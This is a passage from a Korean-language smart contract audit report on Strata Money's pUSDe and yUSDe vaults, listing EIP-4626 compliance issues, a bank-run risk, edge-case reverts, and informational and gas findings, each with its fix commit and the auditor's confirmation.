**Strata:** 커밋 [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae)에서 수정됨.

**Cyfrin:** 확인함.


### `pUSDeVault::maxRedeem`은 상환 일시 중지를 고려하지 않아 EIP-4626을 위반하고 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있음

**설명:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626)은 `maxRedeem`에 대해 다음과 같이 명시합니다:
> 전역 및 사용자별 제한을 모두 고려해야 하며(MUST), 상환이 완전히 비활성화된 경우(일시적이더라도) 0을 반환해야 합니다(MUST).

`pUSDeVault::maxRedeem`은 상환 일시 중지를 고려하지 않아 EIP-4626을 위반하며, 이는 `pUSDeVault`와 통합되는 프로토콜을 손상시킬 수 있습니다. `MetaVault::redeem`은 `_withdraw`를 사용하므로 인출이 일시 중지되면 상환도 일시 중지됩니다.

**개념 증명 (Proof of Concept):**
```solidity
function test_maxRedeem_WhenWithdrawalsPaused() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin pauses withdrawals
    pUSDe.setWithdrawalsEnabled(false);

    // doesn't revert but it should since `MetaVault::redeem` uses `_withdraw`
    // and withdraws are paused, so `maxRedeem` should return 0
    assertEq(pUSDe.maxRedeem(user1), user1AmountInMainVault);

    // reverts with WithdrawalsDisabled
    vm.prank(user1);
    pUSDe.redeem(user1MainVaultShares, user1, user1);

    // https://eips.ethereum.org/EIPS/eip-4626 maxRedeem says:
    // MUST factor in both global and user-specific limits,
    // like if redemption are entirely disabled (even temporarily) it MUST return 0
}
```

**권장 완화 방안:** 인출이 일시 중지된 경우 `maxRedeem`은 0을 반환해야 합니다. `maxRedeem`의 재정의는 일시 중지가 구현된 `PreDepositVault`에서 수행되어야 합니다.

**Strata:** 커밋 [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae)에서 수정됨.

**Cyfrin:** 확인함.


### `yUSDeVault`는 `PreDepositVault`를 상속하지만 `onAfterDepositChecks` 또는 `onAfterWithdrawalChecks`를 호출하지 않음

**설명:** `pUSDeVault`와 `yUSDeVault`는 모두 `PreDepositVault`를 상속합니다.

`pUSDeVault`는 재정의된 `_deposit` 및 `_withdraw` 함수 내에서 `PreDepositVault::onAfterDepositChecks` 및 `onAfterWithdrawalChecks`를 사용합니다.

그러나 `yUSDeVault`는 이를 수행하지 않습니다. 대신 `_deposit` 및 `_withdraw` 내에서 이러한 함수와 동일한 코드를 다시 구현하려고 시도하지만 `onAfterWithdrawalChecks`의 다음 코드를 생략합니다:
```solidity
if (totalSupply() < MIN_SHARES) {
    revert MinSharesViolation();
}
```

**파급력:** `MIN_SHARES` 검사는 `yUSDeVault`에서 강제되지 않습니다.

**권장 완화 방안:** `yUSDeVault::_deposit` 및 `_withdraw` 내에서 `PreDepositVault::onAfterDepositChecks` 및 `onAfterWithdrawalChecks`를 사용하십시오.

또는 `MIN_SHARES` 검사의 생략이 의도적인 경우, `onAfterWithdrawalChecks`에 검사를 수행할지 여부에 대한 부울 매개변수를 추가하여 `yUSDeVault`가 상속하는 두 함수를 사용하여 코드 중복을 줄일 수 있도록 하십시오.

**Strata:** 커밋 [3f02ce5](https://github.com/Strata-Money/contracts/commit/3f02ce5c1076cbcab8943eae320ecfd590c1f634), [0812d57](https://github.com/Strata-Money/contracts/commit/0812d57f006d4cf3606b7a9c99bbbdf576c4e089)에서 수정됨.

**Cyfrin:** 확인함.


### 인출 문제가 있는 볼트에서 제거 및 상환을 할 수 없으면 뱅크런(bank-run)이 발생할 수 있음

**설명:** `pUSDeVault`에 입금할 때 `depositedBase`는 외부 ERC-4626 볼트의 기본 `USDe` 미리보기 견적 금액을 기반으로 증가합니다. 그러나 이러한 즉각적인 미리보기 견적은 실제로 인출 가능한 최대 금액과 비교할 때 반드시 정확하지는 않습니다. 예를 들어, `MetaVault::deposit`은 기본 USDe 자산 계산을 다음과 같이 구현합니다:

```solidity
uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);
```

그러나 볼트가 사용자 지정 로직으로 최대 인출/상환 함수를 재정의하여 일부 제한을 적용하는 경우, 이 미리보기된 값은 실제 최대 인출 가능한 `USDe` 금액보다 클 수 있습니다. ERC-4626 사양에 따르면 미리보기 함수는 maxWithdraw/maxRedeem에서 반환된 것과 같은 인출/상환 제한을 고려해서는 안 되며 상환이 수락되는 것처럼 항상 작동해야 하기 때문에 이것이 가능합니다.

따라서 입금 중 실제로 실행되는 인출이 없으므로 `depositedBase` 상태는 기본 `USDe`가 완전히 상환 가능하다고 가정하고 증가하지만, 타사 볼트가 오작동하거나 인출을 제한하는 경우 볼트를 제거하고 상환할 때까지 되돌리기가 발생하지 않습니다. 현재 주어진 볼트에 대한 신규 입금을 일시 중지하는 유일한 방법은 지원 목록에서 자산을 제거하는 것이지만, 그렇게 하면 `USDe` 인출도 트리거되어 위에서 언급한 이유로 실패할 수 있으며 자산이 제거되는 것을 방지합니다.

외부 지원 볼트 토큰 중 어느 것도 주가 하락과 함께 기능하도록 의도하지 않았지만, 지원되는 볼트 중 하나에서 기본 `USDe`가 도난당하는 스마트 컨트랙트 해킹의 가능성을 배제하는 것은 매우 단순한 구현을 제외하고는 불가능합니다. 위의 문제와 결합하여, 사용자가 자신이 제공한 토큰에 관계없이 지원되는 모든 볼트 토큰으로 자유롭게 인출할 수 있으므로, 영향을 받지 않은 볼트 토큰으로 다른 사용자가 완전히 인출(또는 `MetaVault::redeemRequiredBaseAssets`에 의해 이러한 볼트에서 필요한 `USDe`를 가져와 인출을 처리하는 경우에도)하면, 일부 사용자는 상각되는 대신 악성 부채를 떠안게 될 수 있습니다.

프로토콜 팀은 즉시 인출, 제한 없음, 쿨다운 없음, 일시 중지 불가 등 새로운 타사 볼트를 지원하기 위한 엄격한 기준을 가지고 있는 것으로 이해되지만, 개발 계획 및 업데이트에 대해 강력한 커뮤니케이션 채널을 유지하는 파트너에게는 예외가 적용될 수 있습니다.

**파급력:** 인출 문제가 있는 볼트에서 제거하고 상환할 수 없으면 뱅크런이 발생하여 일부 사용자가 상환할 수 없는 토큰을 갖게 될 수 있습니다.

**권장 완화 방안:** 볼트를 제거하지 않고 기본 토큰을 (시도하여) 완전히 상환하지 않고도 볼트에 대한 신규 입금을 비활성화하는 메커니즘을 구현하십시오. 잠재적인 결함이 있는 볼트의 손실을 상각하려면 `depositedBase`에 대한 개별 볼트 기여도를 추적하여 상환 계산에서 제외할 수 있도록 해야 할 수도 있습니다.

**Strata:** 커밋 [ae71893](https://github.com/Strata-Money/contracts/commit/ae718938d56ac581e9479e2831e5b75c67dda738)에서 수정됨.

**Cyfrin:** 확인함.


### `yUSDeVault` 엣지 케이스는 조회(view) 함수가 되돌려지는 것을 방지하기 위해 명시적으로 처리되어야 함

**설명:** ERC-4626 사양에 따르면 미리보기 함수는 "볼트 별 사용자/글로벌 제한으로 인해 되돌려져서는 안 됩니다(MUST NOT). 민트/입금/상환/인출을 되돌리게 하는 다른 조건으로 인해 되돌려질 수 있습니다(MAY)".

```solidity
    function totalAccruedUSDe() public view returns (uint256) {
@>      uint pUSDeAssets = super.totalAssets();  // @audit - 아래 호출에서 되돌려지는 것을 피하기 위해 pUSDeAssets가 0이면 조기에 반환해야 함

@>      uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);
        return USDeAssets;
    }

    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
@>      uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets); // @audit - pUSDe 잔액이 없을 때 yUSDe를 호출자로 전달하면 되돌려질 수 있음
        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);
        return USDeAssets;
    }

    function previewDeposit(uint256 pUSDeAssets) public view override returns (uint256) {
        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);

@>      uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor); // @audit - _valueMulDiv() 동작에 의존하기보다 totalAccruedUSDe()가 0을 반환하는 경우를 명시적으로 처리해야 함
        return yUSDeShares;
    }

    function previewMint(uint256 yUSDeShares) public view override returns (uint256) {
@>      uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil); // @audit - _valueMulDiv() 동작에 의존하기보다 totalAccruedUSDe() 및/또는 totalAssets()가 0을 반환하는 경우를 명시적으로 처리해야 함
        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);
        return pUSDeAssets;
    }

    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {
        return value.mulDiv(mulValue + 1, divValue + 1, rounding);
    }
```

위의 코드 스니펫에서 `// @audit` 태그로 언급했듯이 `yUSDeVault::previewMint` 및 `yUSDeVault::previewDeposit`은 다음과 같은 여러 가지 이유로 되돌려질 수 있습니다:
* yUSDe 볼트의 pUSDe 잔액이 0일 때.
* `totalAccruedUSDe()` 내의 `_convertAssetsToUSDe()`에서 호출된 `pUSDeVault::previewYield`의 0으로 나누기로 인해 `pUSDeVault::previewRedeem`이 되돌려질 때.

```solidity
     function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {

            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);

@>          uint y_pUSDeShares = balanceOf(caller); // @audit - 아래에서 되돌려지는 것을 피하기 위해 이것이 0이면 조기에 반환해야 함
@>          uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }

    function previewRedeem(address caller, uint256 shares) public view virtual returns (uint256) {
        return previewRedeem(shares) + previewYield(caller, shares);
    }
```

이러한 되돌리기 중 일부는 오버플로와 같이 "입금을 되돌리게 하는 다른 조건"으로 간주될 수 있지만, 이러한 다른 엣지 케이스를 명시적으로 처리하는 것이 좋습니다. 또한 `yUSDeVault::totalAccruedUSDe`는 yUSDeVault의 pUSDe 잔액이 0이면 단독으로 호출될 때도 되돌려집니다. 대신 단순히 0을 반환해야 합니다.

**Strata:** 커밋 [0f366e1](https://github.com/Strata-Money/contracts/commit/0f366e192941c875b651ee4db89b9fd3242a5ac0)에서 수정됨.

**Cyfrin:** 확인함. 0 자산/지분 엣지 케이스는 이제 `yUSDeVault::_convertAssetsToUSDe` 및 `pUSDeVault::previewYield`에서 명시적으로 처리되며, `yUSDe` 상태가 초기화되지 않아 0 주소와 같은 경우도 포함합니다.

\clearpage
## 정보성 (Informational)


### 키와 값의 목적을 명시적으로 나타내기 위해 명명된 매핑(named mappings) 사용

**설명:** 키와 값의 목적을 명시적으로 나타내기 위해 명명된 매핑을 사용하십시오:
```solidity
predeposit/MetaVault.sol
23:    // Track the assets in the mapping for easier access
24:    mapping(address => TAsset) public assetsMap;

predeposit/pUSDeDepositor.sol
35:    mapping (address => TAutoSwap) autoSwaps;

test/MockStakedUSDe.sol
20:  mapping(address => UserCooldown) public cooldowns;
```

**Strata:** 커밋 [ab231d9](https://github.com/Strata-Money/contracts/commit/ab231d99e4ba6c7c82c4928515775a39dc008808)에서 수정됨.

**Cyfrin:** 확인함.


### 업그레이드 가능한 컨트랙트에서 이니셜라이저 비활성화

**설명:** 업그레이드 가능한 컨트랙트에서 이니셜라이저를 비활성화하십시오:
* `yUSDeVault`
* `yUSDeDepositor`
* `pUSDeVault`
* `pUSDeDepositor`

```diff
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+       _disableInitializers();
+    }
```

**Strata:** 커밋 [49060b2](https://github.com/Strata-Money/contracts/commit/49060b25230389feff54597a025a7aa129ceb9f3)에서 수정됨.

**Cyfrin:** 확인함.


### 기본값으로 초기화하지 말 것

**설명:** Solidity가 이미 수행하므로 기본값으로 초기화하지 마십시오:
```solidity
predeposit/MetaVault.sol
220:        for (uint i = 0; i < length; i++) {
241:        for (uint i = 0; i < assetsArr.length; i++) {
```

**Strata:** 커밋 [07b471f](https://github.com/Strata-Money/contracts/commit/07b471f8292d62098ee4ffd97e62d6f0854d96ce)에서 수정됨.

**Cyfrin:** 확인함.


### `uint` 대신 명시적 크기 사용

**설명:** `uint`는 `uint256`으로 기본 설정되지만, 크기를 포함한 명시적 유형을 사용하고 `uint` 사용을 피하는 것이 모범 사례로 간주됩니다:
```solidity
predeposit/yUSDeDepositor.sol
65:        uint beforeAmount = asset.balanceOf(address(this));
73:        uint pUSDeShares = pUSDeDepositor.deposit(asset, amount, address(this));

predeposit/MetaVault.sol
53:        uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);
54:        uint shares = previewDeposit(baseAssets);
70:        uint baseAssets = previewMint(shares);
71:        uint tokenAssets = IERC4626(token).previewWithdraw(baseAssets);
211:        uint balance = IERC20(vaultAddress).balanceOf(address(this));
219:        uint length = assetsArr.length;
220:        for (uint i = 0; i < length; i++) {
240:    function redeemRequiredBaseAssets (uint baseTokens) internal {
241:        for (uint i = 0; i < assetsArr.length; i++) {
243:            uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));

predeposit/pUSDeVault.sol
62:            uint total_sUSDe = sUSDe.balanceOf(address(this));
63:            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);
65:            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
67:            uint y_pUSDeShares = balanceOf(caller);
68:            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);
121:            uint sUSDeAssets = sUSDe.previewWithdraw(assets);
138:        uint USDeBalance = USDe.balanceOf(address(this));
171:        uint USDeBalance = USDe.balanceOf(address(this));

predeposit/yUSDeVault.sol
38:        uint pUSDeAssets = super.totalAssets();
39:        uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);
43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
44:        uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets);
45:        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);
59:        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);
60:        uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor);
74:        uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil);
75:        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);

```

**Strata:** 커밋 [61f5910](https://github.com/Strata-Money/contracts/commit/61f591088754e2666355307cf1e11e6440af8572)에서 수정됨.

**Cyfrin:** 확인함.


### 내부 및 비공개 함수 이름 앞에 `_` 문자 접두사 사용

**설명:** Solidity에서 내부 및 비공개 함수 이름 앞에 `_` 문자를 붙이는 것은 모범 사례로 간주됩니다. 이는 가끔 수행되지만 그렇지 않은 경우도 있습니다. 이상적으로는 일관되게 적용하십시오:
```solidity
predeposit/PreDepositPhaser.sol
15:    function setYieldPhaseInner () internal {

predeposit/yUSDeDepositor.sol
54:    function deposit_pUSDe (address from, uint256 amount, address receiver) internal returns (uint256) {
62:    function deposit_pUSDeDepositor (address from, IERC20 asset, uint256 amount, address receiver) internal returns (uint256) {

predeposit/PreDepositVault.sol
59:    function onAfterDepositChecks () internal view {
64:    function onAfterWithdrawalChecks () internal view {

predeposit/pUSDeVault.sol
93:    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
115:    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {
177:    function stakeUSDe(uint256 USDeAssets) internal returns (uint256) {

predeposit/yUSDeVault.sol
43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
79:    function _deposit(address caller, address receiver, uint256 pUSDeAssets, uint256 shares) internal override {
86:    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {
101:    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {

predeposit/MetaVault.sol
84:    function _deposit(address token, address caller, address receiver, uint256 baseAssets, uint256 tokenAssets, uint256 shares) internal virtual {
160:    ) internal virtual {
175:    function requireSupportedVault(address token) internal view {
191:    function addVaultInner (address vaultAddress) internal {
209:    function removeVaultAndRedeemInner (address vaultAddress) internal {
231:    function redeemMetaVaults () internal {
240:    function redeemRequiredBaseAssets (uint baseTokens) internal {

predeposit/pUSDeDepositor.sol
92:    function deposit_sUSDe (address from, uint256 amount, address receiver) internal returns (uint256) {
102:    function deposit_USDe (address from, uint256 amount, address receiver) internal returns (uint256) {
114:    function deposit_viaSwap (address from, IERC20 token, uint256 amount, address receiver) internal returns (uint256) {
146:    function getPhase () internal view returns (PreDepositPhase phase) {

test/ethena/StakedUSDe.sol
190:  function _checkMinShares() internal view {
203:    internal
225:    internal
239:  function _updateVestingAmount(uint256 newVestingAmount) internal {
251:  function _beforeTokenTransfer(address from, address to, uint256) internal virtual {

test/ethena/SingleAdminAccessControl.sol
72:  function _grantRole(bytes32 role, address account) internal override returns (bool) {
```

**Strata:** 커밋 [b154fec](https://github.com/Strata-Money/contracts/commit/b154fec8957a81b3c0cf6e204e894d60bb0d852b)에서 수정됨.

**Cyfrin:** 확인함.


### 대신 언체인드(unchained) 이니셜라이저 사용

**설명:** [잠재적인 중복 초기화](https://docs.openzeppelin.com/contracts/5.x/upgradeable#multiple-inheritance)를 방지하기 위해 언체인드 이니셜라이저 대신 이니셜라이저 함수를 직접 사용하는 것은 피해야 합니다.

**Strata:**
커밋 [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e)에서 수정됨.

**Cyfrin:** 확인함.


### 누락된 0 입금 금액 유효성 검사


**설명:** `pUSDeDepositor::deposit_USDe`와 달리 `pUSDeDepositor::deposit_sUSDe`는 입금된 금액이 0이 아님을 강제하지 않습니다:

```solidity
require(amount > 0, "Deposit is zero");
```

`yUSDeDepositor::deposit_pUSDeDepositor`와 `yUSDeDepositor::deposit_pUSDe`를 비교할 때도 유사한 경우가 존재합니다.

**Strata:** 커밋 [1378b6a](https://github.com/Strata-Money/contracts/commit/1378b6af08e60aaa768693a9332e98dbb4f01776)에서 수정됨.

**Cyfrin:** 확인함.


### `PreDepositVault::initialize`는 public으로 노출되어서는 안 됨

**설명:** `PreDepositVault::initialize`는 현재 public으로 노출되어 있습니다. 이 상위 함수를 호출하는 `pUSDeVault` 및 `yUSDeVault` 구현을 기반으로 볼 때, 이는 의도된 것이 아닙니다. 이것이 악용 가능하거나 초기화를 방지하는 문제를 일으키는 것으로 보이지는 않지만, 이 기본 구현을 내부(internal)로 표시하고 대신 `onlyInitializing` 제어자를 사용하는 것이 좋습니다.

```diff
    function initialize(
        address owner_
        , string memory name
        , string memory symbol
        , IERC20 USDe_
        , IERC4626 sUSDe_
        , IERC20 stakedAsset
--  ) public virtual initializer {
++  ) internal virtual onlyInitializing {
        __ERC20_init(name, symbol);
        __ERC4626_init(stakedAsset);
        __Ownable_init(owner_);

        USDe = USDe_;
        sUSDe = sUSDe_;
    }
```

**Strata:** 커밋 [6ac05c2](https://github.com/Strata-Money/contracts/commit/6ac05c232a47de6e9935fd6e20af1f0c4540c457) 및 [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e)에서 수정됨.

**Cyfrin:** 확인함. `PreDepositVault::initialize`는 이제 internal로 표시되고 `onlyInitializing` 제어자를 사용합니다.


### `pUSDeVault`와 `yUSDeVault` 간의 `currentPhase` 불일치

**설명:** `pUSDeVault`와 `yUSDeVault` 모두 `PreDepositPhaser`를 상속하는 `PreDepositVault`를 상속합니다. 그러나 단계가 변경될 때 업데이트되는 `pUSDe::currentPhase`의 상태와 업데이트되지 않고 항상 기본 `PointsPhase` 변형인 `yUSDe::currentPhase` 사이에는 불일치가 있습니다. 이 상태는 `yUSDe` 볼트에 필요하지 않은 것으로 가정되지만, 상태 변수가 public이므로 노출되는 조회 함수는 혼란을 야기할 수 있습니다.

**권장 완화 방안:** 가장 간단한 해결책은 이 상태를 기본적으로 internal로 수정하고 `pUSDeVault` 내에서만 해당 조회 함수를 노출하는 것입니다.

**Strata:** 커밋 [aac3b61](https://github.com/Strata-Money/contracts/commit/aac3b617084fb5a06b29728a9f52e5884b062b6a)에서 수정됨.

**Cyfrin:** 확인함. `yUSDeVault`는 이제 `pUSDeVault` 단계 상태를 반환합니다.

\clearpage
## 가스 최적화 (Gas Optimization)


### 동일한 스토리지 읽기 캐시

**설명:** 스토리지에서 읽는 것은 비용이 많이 들기 때문에 값을 캐시하고 스토리지가 변경되지 않은 경우 캐시에서 읽는 것이 가스 효율적입니다. 동일한 스토리지 읽기를 캐시하십시오:

`PreDepositPhaser.sol`:
```solidity
// use PreDepositPhase.YieldPhase instead
19:        emit PhaseStarted(currentPhase);
```

`pUSDeDepositor.sol`:
```solidity
// cache sUSDe and pUSDe to save 3 storage reads
// also change `deposit` to cache `sUSDe` and pass it as input to `deposit_sUSDe` saves 1 more storage read
96:            SafeERC20.safeTransferFrom(sUSDe, from, address(this), amount);
98:        sUSDe.approve(address(pUSDe), amount);
99:        return IMetaVault(address(pUSDe)).deposit(address(sUSDe), amount, receiver);

// cache USDe and pUSDe to save 2 storage reads
// also change `deposit` to cache `USDe` and pass it as input to `deposit_USDe` saves 1 more storage read
107:            SafeERC20.safeTransferFrom(USDe, from, address(this), amount);
110:        USDe.approve(address(pUSDe), amount);
111:        return pUSDe.deposit(amount, receiver);

// cache USDe to save 2 storage reads
// also change `deposit` to cache `USDe` and `autoSwaps[address(asset)]` then pass them as inputs to `deposit_viaSwap` saves 2 more storage reads
127:        uint256 USDeBalance = USDe.balanceOf(address(this));
130:            tokenOut: address(USDe),
140:        uint256 amountOut = USDe.balanceOf(address(this)) - USDeBalance;
```

`yUSDeDepositor.sol`:
```solidity
// cache pUSDe and yUSDe to save 2 storage reads
56:            SafeERC20.safeTransferFrom(pUSDe, from, address(this), amount);
58:        pUSDe.approve(address(yUSDe), amount);
59:        return yUSDe.deposit(amount, receiver);
```

`MetaVault.sol`:
```solidity
// cache assetsArr.length
241:        for (uint i = 0; i < assetsArr.length; i++) {
```

**Strata:** 커밋 [9a19939](https://github.com/Strata-Money/contracts/commit/9a1993975912fbcbaf684811b25de229947671c9)에서 수정됨.

**Cyfrin:** 확인함.


### 읽기 전용 외부 함수 입력에 `memory` 대신 `calldata`를 사용하는 것이 더 효율적임

**설명:** 읽기 전용 외부 함수 입력에 `memory` 대신 `calldata`를 사용하는 것이 더 효율적입니다:

`PreDepositVault`:
```solidity
35:        , string memory name
36:        , string memory symbol
```

**Strata Money:**
"initialize" (__init_Vault)는 이제 internal이므로 매개변수에 calldata를 사용할 수 없습니다.

**Cyfrin:** 인지함.


### 함수 내 변수 선언을 제거할 수 있는 경우 명명된 반환(named returns) 사용

**설명:** 함수 내 변수 선언을 제거할 수 있는 경우 명명된 반환을 사용하십시오:

* `yUSDeVault` : 함수 `totalAccruedUSDe`, `_convertAssetsToUSDe`, `previewDeposit`, `previewMint`
* `pUSDeVault` : 함수 `previewYield`
* `MetaVault` : 함수 `deposit`, `mint`, `withdraw`, `redeem`

**Strata:** 커밋 [3241635](https://github.com/Strata-Money/contracts/commit/32416357ac166b072e4339471107e40950952a08) 및 [c68a705](https://github.com/Strata-Money/contracts/commit/c68a7053097a1909c13c98b6a5678a102f3f5007)에서 수정됨.

**Cyfrin:** 확인함.


### 한 번만 사용되는 작은 내부 함수 인라인화

**설명:** 한 번만 사용되는 작은 내부 함수를 인라인화하는 것이 더 가스 효율적입니다.

예를 들어 `pUSDeDepositor::getPhase`는 `deposit_sUSDe`에서만 호출됩니다. `deposit_sUSDe`를 변경하여 `pUSDe`를 캐시한 다음 `PreDepositPhaser::currentPhase` 호출에서 캐시된 사본을 사용하면 함수 호출 오버헤드를 절약하는 것 외에도 1개의 스토리지 읽기를 절약할 수 있습니다.

**Strata:** 커밋 [9398379](https://github.com/Strata-Money/contracts/commit/93983791adbd45a555d947a12a5a6fd9bbfe7330)에서 수정됨.

**Cyfrin:** 확인함.


### `PreDepositVault` 검사는 조기에 실패해야 함

**설명:** `PreDepositVault`는 몇 가지 불변성을 강제하기 위해 입금/인출 후 검사를 구현합니다. 그러나 호출 함수 실행 후 최소 지분 위반을 확인하는 것만 필요합니다. 가스를 덜 소비하려면 이러한 검사를 별도의 전/후 함수로 분할하고 입금 또는 인출이 비활성화된 경우 조기에 되돌리는 것이 좋습니다.

```solidity
function onAfterDepositChecks () internal view {
    if (!depositsEnabled) {
        revert DepositsDisabled();
    }
}
function onAfterWithdrawalChecks () internal view {
    if (!withdrawalsEnabled) {
        revert WithdrawalsDisabled();
    }
    if (totalSupply() < MIN_SHARES) {
        revert MinSharesViolation();
    }
}
```

**Strata:** 인지함. 일시 중지 상태는 엣지 케이스로 간주되므로 일반적인 사용 시 사용자는 필요한 모든 검사에 대해 단일 메서드 호출의 이점을 얻을 수 있습니다.

**Cyfrin:** 인지함.


### `pUSDeDepositor::deposit`에서 불필요한 볼트 지원 유효성 검사 제거 가능

**설명:** `pUSDeDepositor::deposit` 호출자가 `USDe`가 아니거나 자동 스왑 경로로 미리 구성된 토큰이 아닌 볼트 토큰을 입금하려고 하면 먼저 `MetaVault::isAssetSupported`를 조회합니다:

```solidity
    function deposit(IERC20 asset, uint256 amount, address receiver) external returns (uint256) {
        address user = _msgSender();
        ...
        IMetaVault vault = IMetaVault(address(pUSDe));
@>      if (vault.isAssetSupported(address(asset))) {
            SafeERC20.safeTransferFrom(asset, user, address(this), amount);
            asset.approve(address(vault), amount);
            return vault.deposit(address(asset), amount, receiver);
        }
@>      revert InvalidAsset(address(asset));
    }
```

지정된 볼트 토큰이 모든 유효성 검사에 실패하면 `InvalidAsset` 사용자 정의 오류로 떨어지지만, `MetaVault::deposit`이 이미 `MetaVault::requireSupportedVault` 내에서 동일한 유효성 검사를 수행하므로 이것이 반드시 필요한 것은 아닙니다:

```solidity
    function deposit(address token, uint256 tokenAssets, address receiver) public virtual returns (uint256) {
        if (token == asset()) {
            return deposit(tokenAssets, receiver);
        }
@>      requireSupportedVault(token);
        ...
    }

    function requireSupportedVault(address token) internal view {
        address vaultAddress = assetsMap[token].asset;
        if (vaultAddress == address(0)) {
@>          revert UnsupportedAsset(token);
        }
    }
```

**권장 완화 방안:** 조기에 실패하는 것이 의도된 것이 아니라면, 행복한 경로(happy path) 케이스에서 가스를 절약하기 위해 불필요한 유효성 검사를 제거하는 것을 고려하십시오:

```diff
function deposit(IERC20 asset, uint256 amount, address receiver) external returns (uint256) {
        address user = _msgSender();
        ...
        IMetaVault vault = IMetaVault(address(pUSDe));
--      if (vault.isAssetSupported(address(asset))) {
            SafeERC20.safeTransferFrom(asset, user, address(this), amount);
            asset.approve(address(vault), amount);
            return vault.deposit(address(asset), amount, receiver);
--      }
--      revert InvalidAsset(address(asset));
    }
```

**Strata:** 커밋 [7f0c5dc](https://github.com/Strata-Money/contracts/commit/7f0c5dc54d1230589e2d9403b69effd64fb35227)에서 수정됨.

**Cyfrin:** 확인함.


### `pUSDeVault::stakeUSDe`에서 사용되지 않는 반환 값을 제거하고 `USDeAssets == 0`인 경우 명시적으로 되돌리기

**설명:** `pUSDeVault::stakeUSDe`에서 사용되지 않는 반환 값을 제거하고 `USDeAssets == 0`인 경우 명시적으로 되돌리십시오.

**Strata:** 커밋 [513d589](https://github.com/Strata-Money/contracts/commit/513d5890771d9bbe520740ef8f26a24931bf5590)에서 수정됨.

**Cyfrin:** 확인함.


### `MetaVault::redeemMetaVaults`의 불필요하게 복잡한 반복 로직을 단순화할 수 있음

**설명:** `MetaVault::redeemMetaVaults`는 현재 `assetsArr` 배열에서 요소를 제거하기 위해 "replace-and-pop" 솔루션을 구현하는 `MetaVault::removeVaultAndRedeemInner`를 호출하고 첫 번째 배열 요소를 인덱싱하는 while 루프로 구현되어 있습니다:

```solidity
    function removeVaultAndRedeemInner (address vaultAddress) internal {
        // Redeem
        uint balance = IERC20(vaultAddress).balanceOf(address(this));
        if (balance > 0) {
            IERC4626(vaultAddress).redeem(balance, address(this), address(this));
        }

        // Clean
        TAsset memory emptyAsset;
        assetsMap[vaultAddress] = emptyAsset;
        uint length = assetsArr.length;
        for (uint i = 0; i < length; i++) {
            if (assetsArr[i].asset == vaultAddress) {
@>              assetsArr[i] = assetsArr[length - 1];
@>              assetsArr.pop();
                break;
            }
        }
    }

    function redeemMetaVaults () internal {
        while (assetsArr.length > 0) {
@>          removeVaultAndRedeemInner(assetsArr[0].asset);
        }
    }
```

이 로직은 컨트랙트 관리자가 단일 기본 볼트를 수동으로 제거할 수 있는 `MetaVault::removeVault`에 사용하기 위해 여전히 필요하지만, `MetaVault::redeemMetaVaults`에 이 기능을 다시 사용하는 것은 피하는 것이 좋습니다. 대신 마지막 요소부터 시작하여 뒤로 이동하면 배열의 순서를 유지하고 불필요한 스토리지 쓰기를 피할 수 있습니다.

